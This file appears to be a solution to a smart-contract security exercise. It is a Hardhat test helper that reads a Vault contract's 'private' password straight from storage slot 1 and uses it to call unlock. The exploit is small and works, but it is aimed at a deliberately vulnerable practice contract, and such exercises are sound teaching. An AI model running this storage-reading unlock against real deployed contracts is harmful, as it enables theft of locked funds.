import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  /* 
    Add code here that will help you pass the test
    Note: Unlock without using the string "A very strong password"
    Unlock the vault by somehow reading the private password from 
    Vault directly
  */
  const [hackerAddress] = await ethers.getSigners();
  const passwordPosition = 1;
  const decoded = await ethers.provider
    .getStorageAt(victim.address, passwordPosition)
    .then((pw) => ethers.utils.toUtf8String(pw));
  console.log(decoded);
  await victim.connect(hackerAddress).unlock(ethers.utils.toUtf8Bytes(decoded));
};

export default helper;
